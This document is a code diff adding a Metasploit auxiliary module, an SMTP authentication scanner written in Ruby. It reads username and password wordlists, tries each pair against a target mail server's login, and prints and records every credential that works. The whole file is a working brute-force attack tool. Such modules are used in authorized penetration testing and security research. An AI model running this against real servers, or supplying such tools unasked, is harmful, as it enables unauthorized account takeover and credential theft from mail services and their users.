@@ -1,0 +1,48 @@
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::AuthBrute
+
+  def initialize
+    super(
+      'Name'        => 'SMTP Authentication Scanner',
+      'Description' => 'This module attempts to authenticate against an SMTP service.',
+      'Author'      => ['todb', 'hdm'],
+      'License'     => MSF_LICENSE
+    )
+
+    register_options([
+      Opt::RPORT(25),
+      OptBool.new('STARTTLS', [true, 'Negotiate SSL for SMTP connection', false]),
+      OptBool.new('SSL', [true, 'Use SSL', false]),
+      OptPath.new('USER_FILE', [false, 'File containing usernames, one per line']),
+      OptPath.new('PASS_FILE', [false, 'File containing passwords, one per line']),
+    ])
+  end
+
+  def run_host(ip)
+    each_user_pass do |user, pass|
+      print_status("#{ip}:#{rport} - Trying #{user}/#{pass}")
+      begin
+        res = connect_login({username: user, password: pass})
+        if res && res[:status] == :success
+          print_good("#{ip}:#{rport} - SUCCESSFUL LOGIN - #{user}/#{pass}")
+          report_auth_info(
+            host: ip,
+            port: rport,
+            sname: 'smtp',
+            user: user,
+            pass: pass,
+            active: true
+          )
+          return :next_user
+        end
+      rescue ::Exception => e
+        print_error("#{ip}:#{rport} - Error: #{e}")
+      ensure
+        disconnect
+      end
+    end
+  end
+end
